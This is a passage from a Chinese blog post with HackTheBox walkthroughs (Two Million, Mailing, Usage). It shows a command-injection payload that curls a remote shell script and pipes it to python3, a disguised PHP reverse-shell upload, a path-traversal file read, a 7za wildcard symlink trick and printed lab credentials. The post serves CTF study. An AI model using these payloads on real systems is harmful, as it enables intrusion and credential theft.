XSRF-TOKEN=eyJpdiI6IkhFakpQK2l4cU5sYkhHZzZoN00rUmc9PSIsInZhbHVlIjoiYysvaTY0WDl1dXBXMGR2TzM5YWt2aEg4T051akNzTDFxcWJzUC9yY3pPajN4ei9FRTRJbzNuQ2htY0pmc25xWGR5anV6UzFHTkJ1N2tYYWlJcUEzNjZnSmNVMzdaa0hWNWlST3BVeTlqUnpBdVJ0aEVlOTVUSnBlNXdTa29UTk8iLCJtYWMiOiI0NzIxOTRkMTk4ZWEyN2E2YjI1YTA1NzI4ODg3MzFjZWM0YjJkZGRhNTZjOWYxZGVkNmRjMWRkNTYyNzYzMjUwIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IktHWU1MYzFSNDBvSEN1M2dRSVJlTmc9PSIsInZhbHVlIjoib1FJU1RXWWxPV0ZRem5NNGJxUzR1QkdCdFpYMm8yWGxNblhFL0hIaFdnOWxSK3c0bStqNk9wY1Jsd3ZPZHFTTkdCWjByMnJNTkNnV21hZVJrZGZZcTdBbTFpT3YzOVBubENxT09FWTdBQlhPdEZoTGExMnZHdUZXZ0svOEF5cHkiLCJtYWMiOiI1NWNhNDg3OWZmOTEzNjkzNDMxZGNkZDVjODljMzBkMTRkYzcwZjU2MjI4ZDk5NTBkNzAxOTdhMzlkNTk3MzAxIiwidGFnIjoiIn0%3D\nConnection: close\n\n_token=KwTPctNAzmgzsn7wIgf7PC16p7nJ52U7AGT0MNHQ&email=a%40a.com # 注意这里用手注的 payload\n```\n\n<这里想起来就补>\n\n用 john 爆出密码 `whatever1`，在 `admin.usage.htb` 登录。\n发现没什么能做的，只有头像能改，测试只有前端有文件后缀校验，于是传一个 PHP 反弹 shell 的 png 上去，再用 burp 改成 .php 再传一次，刷新页面，拿到 shell。\n传 linpeas.sh 开扫，发现 `/home/dash/.ssh/id_rsa`，下到本地，登录\n\n```bash\nchmod 600 dash.pri  # 不然不给连\nssh -i dash.pri dash@10.10.11.18\n```\n\n`/home/dash` 目录下有个 `.monitrc`，内容如下：\n\n```bash\n#Monitoring Interval in Seconds\nset daemon  60\n\n#Enable Web Access\nset httpd port 2812\n     use address 127.0.0.1\n     allow admin:3nc0d3d_pa$$w0rd\n\n#Apache\ncheck process apache with pidfile \"/var/run/apache2/apache2.pid\"\n    if cpu > 80% for 2 cycles then alert\n\n\n#System Monitoring\ncheck system usage\n    if memory usage > 80% for 2 cycles then alert\n    if cpu usage (user) > 70% for 2 cycles then alert\n        if cpu usage (system) > 30% then alert\n    if cpu usage (wait) > 20% then alert\n    if loadavg (1min) > 6 for 2 cycles then alert\n    if loadavg (5min) > 4 for 2 cycles then alert\n    if swap usage > 5% then alert\n\ncheck filesystem rootfs with path /\n       if space usage > 80% then alert\n```\n\n这里就藏着 xander 的密码 `3nc0d3d_pa$$w0rd`（感觉有点脑洞）\n登录后 `sudo -l` 看一眼，发现可以 `sudo /usr/bin/usage_management`，把文件拖下看用 IDA 看一眼\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [rsp+Ch] [rbp-4h] BYREF\n\n  puts(\"Choose an option:\");\n  puts(\"1. Project Backup\");\n  puts(\"2. Backup MySQL data\");\n  puts(\"3. Reset admin password\");\n  printf(\"Enter your choice (1/2/3): \");\n  __isoc99_scanf(\"%d\", &v4);\n  if ( v4 == 3 )\n  {\n    resetAdminPassword();\n  }\n  else\n  {\n    if ( v4 > 3 )\n    {\nLABEL_9:\n      puts(\"Invalid choice.\");\n      return 0;\n    }\n    if ( v4 == 1 )\n    {\n      backupWebContent();\n    }\n    else\n    {\n      if ( v4 != 2 )\n        goto LABEL_9;\n      backupMysqlData();\n    }\n  }\n  return 0;\n}\n```\n\n发现 `resetAdminPassword` 是用来消遣你的\n\n```c\nint resetAdminPassword()\n{\n  return puts(\"Password has been reset.\");\n}\nvoid backupWebContent()\n{\n  if ( chdir(\"/var/www/html\") )\n    perror(\"Error changing working directory to /var/www/html\");\n  else\n    system(\"/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *\");\n}\nint backupMysqlData()\n{\n  return system(\"/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql\");\n}\n```\n\n来分析一下这句命令\n\n```bash\n/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *\n```\n\n`7za` 是 7zip 的命令行版本，`a` 是添加文件到压缩包，位置为 `/var/backups/project.zip`，`-tzip` 指定压缩格式为 zip，`-snl` 将符号链接作为链接存储，即不是压缩其指向的内容，`-mmt` 是多线程压缩，`--` 结束选项，`*` 压缩所有文件。\n[Hacktricks](https://book.hacktricks.xyz/v/cn/linux-hardening/privilege-escalation/wildcards-spare-tricks) 提到了利用这个的 trick，在 7z 中，`@` 开头的文件名会被当作文件列表，所以如下命令执行的时候 7z 会把 `root.txt` 当作文件列表，然后尝试对 `root.txt` 里列出的文件进行压缩\n\n```bash\ncd /var/www/html\ntouch @root.txt\nln -s /root/root.txt root.txt\n```\n\n然后再执行备份命令，就能在报错信息看到 root.txt 的内容了。\n\n> 软链接与硬链接\n  这里说一下软链接与硬链接的区别，软链接类似 Windows 中的快捷方式，可以跨越文件系统，硬链接则不行。所有硬链接，包括原文件指向的都是同一个 inode（索引节点），众生平等，除非只剩最后一个，否则删除一个硬链接不会影响其他硬链接，而软链接则不同，删除原文件会导致软链接失效。\n  生成方法上，软链接 `ln -s`；硬链接 `ln`，目录则需要 `cp -al /path/to/dir /path/to/link`。\n  一般来说，软链接用得多，硬链接用得少。\n\n## 参考\n\nTwo Million\n<https://h4r1337.github.io/posts/two-million/>\n<https://blog.csdn.net/song_lee/article/details/131245481>\nMailing\n<https://blog.csdn.net/m0_52742680/article/details/138482768>\n<https://blog.csdn.net/whale_waves/article/details/138896310>\nBoardLight\n<https://blog.csdn.net/m0_52742680/article/details/139233464>\n<https://blog.csdn.net/2201_75526400/article/details/139304432>\nUsage\n<https://blog.csdn.net/zr1213159840/article/details/124548770>\n<https://amandaguglieri.github.io/hackinglife/htb-usage/>\n","slug":"HackTheBox 笔记 - 1","published":1,"updated":"2024-06-07T18:45:02.560Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zod9000h7slz5erfc2xv","content":"<p>不得不找饭吃了。<br>Two Million / Mailing / BoardLight / Usage</p>\n<span id=\"more\"></span>\n\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><p>国内访问比较慢，生成 VPN 的时候选 TCP，然后在下载的 <code>.ovpn</code> 文件里加一行 <code>http-proxy ip:port</code>，再用 <code>openvpn</code> 连接就行了，快很多。</p>\n<h2 id=\"新手村\"><a href=\"#新手村\" class=\"headerlink\" title=\"新手村\"></a>新手村</h2><p>四道基础题，基本就是 nmap 扫。<br>主要记住一些参数，比如 <code>-p-</code> 扫描所有端口，<code>--min-rate &lt;num&gt;</code> 设置扫描速率，<code>-n</code> 不解析域名，<code>-sS</code> SYN 扫描，<code>-Pn</code> 不 ping 主机，<code>--open</code> 只显示开放端口，<code>--stats-every &lt;num&gt;</code> 每扫描多少个端口显示一次统计信息，<code>-vv</code> 详细输出。</p>\n<h2 id=\"Two-Million\"><a href=\"#Two-Million\" class=\"headerlink\" title=\"Two Million\"></a>Two Million</h2><p>扫出来两个端口，一个是 80，一个是 22。</p>\n<p>访问 80 端口，301 到 2million.htb，改 <code>etc/host</code> 加一行 <code>10.10.11.221    2million.htb</code>，再访问，发现是个登录页面。<br>根据提示找到 <code>inviteapi.min.js</code>，内容如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">eval</span>(</span><br><span class=\"line\">  <span class=\"keyword\">function</span> (<span class=\"params\">p, a, c, k, e, d</span>) &#123;</span><br><span class=\"line\">    e = <span class=\"keyword\">function</span> (<span class=\"params\">c</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> c.<span class=\"title function_\">toString</span>(<span class=\"number\">36</span>)</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"string\">&#x27;&#x27;</span>.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^/</span>, <span class=\"title class_\">String</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">while</span> (c--) &#123;</span><br><span class=\"line\">        d[c.<span class=\"title function_\">toString</span>(a)] = k[c] ||</span><br><span class=\"line\">        c.<span class=\"title function_\">toString</span>(a)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      k = [</span><br><span class=\"line\">        <span class=\"keyword\">function</span> (<span class=\"params\">e</span>) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> d[e]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ];</span><br><span class=\"line\">      e = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;\\\\w+&#x27;</span></span><br><span class=\"line\">      &#125;;</span><br><span class=\"line\">      c = <span class=\"number\">1</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (c--) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (k[c]) &#123;</span><br><span class=\"line\">        p = p.<span class=\"title function_\">replace</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">RegExp</span>(<span class=\"string\">&#x27;\\\\b&#x27;</span> + <span class=\"title function_\">e</span>(c) + <span class=\"string\">&#x27;\\\\b&#x27;</span>, <span class=\"string\">&#x27;g&#x27;</span>), k[c])</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p</span><br><span class=\"line\">  &#125;(</span><br><span class=\"line\">    <span class=\"string\">&#x27;1 i(4)&#123;h 8=&#123;&quot;4&quot;:4&#125;;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\\&#x27;/d/e/n\\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;1 j()&#123;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,b:\\&#x27;/d/e/k/l/m\\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"number\">24</span>,</span><br><span class=\"line\">    <span class=\"number\">24</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#x27;</span>.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;|&#x27;</span>),</span><br><span class=\"line\">    <span class=\"number\">0</span>,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  )</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n<p>打开 <a href=\"https://lelinhtinh.github.io/de4js/\">de4js</a> 去混淆得到：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">verifyInviteCode</span>(<span class=\"params\">code</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> formData = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;code&quot;</span>: code</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    $.<span class=\"title function_\">ajax</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">type</span>: <span class=\"string\">&quot;POST&quot;</span>,</span><br><span class=\"line\">        <span class=\"attr\">dataType</span>: <span class=\"string\">&quot;json&quot;</span>,</span><br><span class=\"line\">        <span class=\"attr\">data</span>: formData,</span><br><span class=\"line\">        <span class=\"attr\">url</span>: <span class=\"string\">&#x27;/api/v1/invite/verify&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\">response</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">error</span>: <span class=\"keyword\">function</span> (<span class=\"params\">response</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">makeInviteCode</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    $.<span class=\"title function_\">ajax</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">type</span>: <span class=\"string\">&quot;POST&quot;</span>,</span><br><span class=\"line\">        <span class=\"attr\">dataType</span>: <span class=\"string\">&quot;json&quot;</span>,</span><br><span class=\"line\">        <span class=\"attr\">url</span>: <span class=\"string\">&#x27;/api/v1/invite/how/to/generate&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\">response</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">error</span>: <span class=\"keyword\">function</span> (<span class=\"params\">response</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>执行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl http://2million.htb/api/v1/invite/how/to/generate -X POST</span><br></pre></td></tr></table></figure>\n\n<p>得到</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;0&quot;</span><span class=\"punctuation\">:</span><span class=\"number\">200</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;success&quot;</span><span class=\"punctuation\">:</span><span class=\"number\">1</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;data&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;data&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;enctype&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;ROT13&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;hint&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>直接 CyberChef 解 ROT13 得到 In order to generate the invite code, make a POST request to /api/v1/invite/generate。<br>好吧，改个 PATH，再 POST 一下，得到</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;0&quot;</span><span class=\"punctuation\">:</span><span class=\"number\">200</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;success&quot;</span><span class=\"punctuation\">:</span><span class=\"number\">1</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;data&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;code&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;QUtZOEYtMENKMzMtSEE5OVEtS1VHTzQ=&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;format&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;encoded&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>解码得到 <code>PBBOO-D9FOB-9BVZP-KCGHW</code>，不知道为什么 POST 到 <code>/api/v1/invite/verify</code> 的结果是 invalid。不管。</p>\n<p>注册登录后，顺着提示点击 Connection Pack，下载链接为 <code>/api/v1/user/vpn/generate</code>。<br>访问 <code>/api/v1</code>，得到一堆 API。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1</span><br><span class=\"line\">  user</span><br><span class=\"line\">    GET</span><br><span class=\"line\">      /api/v1 &quot;Route List&quot;</span><br><span class=\"line\">      /api/v1/invite/how/to/generate &quot;Instructions on invite code generation&quot;</span><br><span class=\"line\">      /api/v1/invite/generate &quot;Generate invite code&quot;</span><br><span class=\"line\">      /api/v1/invite/verify &quot;Verify invite code&quot;</span><br><span class=\"line\">      /api/v1/user/auth &quot;Check if user is authenticated&quot;</span><br><span class=\"line\">      /api/v1/user/vpn/generate &quot;Generate a new VPN configuration&quot;</span><br><span class=\"line\">      /api/v1/user/vpn/regenerate &quot;Regenerate VPN configuration&quot;</span><br><span class=\"line\">      /api/v1/user/vpn/download &quot;Download OVPN file&quot;</span><br><span class=\"line\">    POST </span><br><span class=\"line\">      /api/v1/user/register &quot;Register a new user&quot;</span><br><span class=\"line\">      /api/v1/user/login &quot;Login with existing user&quot;</span><br><span class=\"line\">  admin </span><br><span class=\"line\">    GET </span><br><span class=\"line\">      /api/v1/admin/auth &quot;Check if user is admin&quot;</span><br><span class=\"line\">    POST </span><br><span class=\"line\">      /api/v1/admin/vpn/generate &quot;Generate VPN for specific user&quot;</span><br><span class=\"line\">    PUT </span><br><span class=\"line\">      /api/v1/admin/settings/update &quot;Update user settings&quot;</span><br></pre></td></tr></table></figure>\n\n<p>发现 <code>/api/v1/admin/settings/update</code> 能改管理员身份，传一个</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;email&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;a@a.com&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;is_admin&quot;</span><span class=\"punctuation\">:</span><span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>就能把自己改成 admin。</p>\n<p>对 <code>/api/v1/admin/vpn/generate</code> 进行命令注入：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\"><span class=\"attr\">&quot;username&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;abc;curl 10.10.14.20:5555/rshell.py | python3;ls&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>把 shell 弹出来。<br><code>cat .env</code> 看到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DB_HOST=127.0.0.1</span><br><span class=\"line\">DB_DATABASE=htb_prod</span><br><span class=\"line\">DB_USERNAME=admin</span><br><span class=\"line\">DB_PASSWORD=SuperDuperPass123</span><br></pre></td></tr></table></figure>\n\n<p>连一下数据库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql --user admin --password htb_prod</span><br></pre></td></tr></table></figure>\n\n<p>发现里面没啥有用的，用数据库的密码试一下 ssh，发现密码是相同的。于是登上 admin，然后读 <code>user.txt</code> 拿到第一个 flag。</p>\n<p>然后根据提示找到 <code>/var/mail/admin</code>，里面说 OverlayFS 有 CVE，定位到 CVE-2023-0386。</p>\n<p>用<a href=\"https://github.com/xkaneiki/CVE-2023-0386\">这个 PoC</a> 打一下就行了。<br>后面题目问 GLIBC 版本，执行 <code>ldd --version</code> 即可。</p>\n<p>还留下了一个 CVE-2023-4911，有空再看。</p>\n<h3 id=\"CVE-2023-0386\"><a href=\"#CVE-2023-0386\" class=\"headerlink\" title=\"CVE-2023-0386\"></a>CVE-2023-0386</h3><p>下面来详细分析一下这个 CVE。</p>\n<h4 id=\"FUSE\"><a href=\"#FUSE\" class=\"headerlink\" title=\"FUSE\"></a>FUSE</h4><p>FUSE(Filesystem in Userspace)</p>\n<h2 id=\"Mailing\"><a href=\"#Mailing\" class=\"headerlink\" title=\"Mailing\"></a>Mailing</h2><p>VMWare 的 Kali GUI 崩了，登录完直接黑屏，我之前也忘了存个快照，于是现在就采用纯命令行 + 代理转发的形式用，反正 GUI 里也只图个 Browser 和 Burpsuite。</p>\n<p>还是用的 squid，squid.conf 按下面配置，再重启一下服务就行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">acl all src all</span><br><span class=\"line\">http_access allow all</span><br><span class=\"line\">hosts_file /etc/hosts</span><br><span class=\"line\">http_port 3128</span><br></pre></td></tr></table></figure>\n\n<p>Burpsuite 里 settings -&gt; Network -&gt; Connection -&gt; Upstream Proxy Servers，设置好代理，然后就能用了。<br>nmap 一扫发现一堆端口，基本都是邮件服务相关，结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PORT      STATE SERVICE</span><br><span class=\"line\">25/tcp    open  smtp</span><br><span class=\"line\">80/tcp    open  http</span><br><span class=\"line\">110/tcp   open  pop3</span><br><span class=\"line\">135/tcp   open  msrpc</span><br><span class=\"line\">139/tcp   open  netbios-ssn</span><br><span class=\"line\">143/tcp   open  imap</span><br><span class=\"line\">445/tcp   open  microsoft-ds</span><br><span class=\"line\">465/tcp   open  smtps</span><br><span class=\"line\">587/tcp   open  submission</span><br><span class=\"line\">993/tcp   open  imaps</span><br><span class=\"line\">5040/tcp  open  unknown</span><br><span class=\"line\">5985/tcp  open  wsman</span><br><span class=\"line\">7680/tcp  open  pando-pub</span><br><span class=\"line\">47001/tcp open  winrm</span><br><span class=\"line\">49664/tcp open  unknown</span><br><span class=\"line\">49665/tcp open  unknown</span><br><span class=\"line\">49666/tcp open  unknown</span><br><span class=\"line\">49667/tcp open  unknown</span><br><span class=\"line\">49668/tcp open  unknown</span><br><span class=\"line\">50304/tcp open  unknown</span><br></pre></td></tr></table></figure>\n\n<p>dirsearch 扫出 <code>/assets/</code> 和 <code>/download.php</code>。<br><code>/assets/</code> 存着一些图片，<code>/download.php</code> 可以任意文件读。<br>由前面扫到的端口可知这是一个 hMailServer，所以可以直接读 <code>hMailServer.INI</code>。<br><code>?file=../../../../../../../../../Program%20Files%20(x86)/hMailServer/Bin/hMailServer.INI</code> 读出如下内容：</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[Directories]</span></span><br><span class=\"line\"><span class=\"attr\">ProgramFolder</span>=C:\\Program Files (x86)\\hMailServer</span><br><span class=\"line\"><span class=\"attr\">DatabaseFolder</span>=C:\\Program Files (x86)\\hMailServer\\Database</span><br><span class=\"line\"><span class=\"attr\">DataFolder</span>=C:\\Program Files (x86)\\hMailServer\\Data</span><br><span class=\"line\"><span class=\"attr\">LogFolder</span>=C:\\Program Files (x86)\\hMailServer\\Logs</span><br><span class=\"line\"><span class=\"attr\">TempFolder</span>=C:\\Program Files (x86)\\hMailServer\\Temp</span><br><span class=\"line\"><span class=\"attr\">EventFolder</span>=C:\\Program Files (x86)\\hMailServer\\Events</span><br><span class=\"line\"><span class=\"section\">[GUILanguages]</span></span><br><span class=\"line\"><span class=\"attr\">ValidLanguages</span>=english,swedish</span><br><span class=\"line\"><span class=\"section\">[Security]</span></span><br><span class=\"line\"><span class=\"attr\">AdministratorPassword</span>=<span class=\"number\">841</span>bb5acfa6779ae432fd7a4e6600ba7</span><br><span class=\"line\"><span class=\"section\">[Database]</span></span><br><span class=\"line\"><span class=\"attr\">Type</span>=MSSQLCE</span><br><span class=\"line\"><span class=\"attr\">Username</span>=</span><br><span class=\"line\"><span class=\"attr\">Password</span>=<span class=\"number\">0</span>a9f8ad8bf896b501dde74f08efd7e4c</span><br><span class=\"line\"><span class=\"attr\">PasswordEncryption</span>=<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">Port</span>=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"attr\">Server</span>=</span><br><span class=\"line\"><span class=\"attr\">Database</span>=hMailServer</span><br><span class=\"line\"><span class=\"attr\">Internal</span>=<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>admin 的密码 hash 为 841bb5acfa6779ae432fd7a4e6600ba7，用 hash-identifier 判断是 MD5，用在线网站解密得到 <code>homenetworkingadministrator</code>。</p>\n<p>md5 在线解密的网站有 <a href=\"https://hashes.com/zh/decrypt/hash\">Hashes</a>，<a href=\"https://crackstation.net/\">crackstation</a> 等。</p>\n<p>用 CVE-2024-21413 打，参考<a href=\"https://www.freebuf.com/vuls/396256.html\">这篇文章</a>，先启动 NTLM 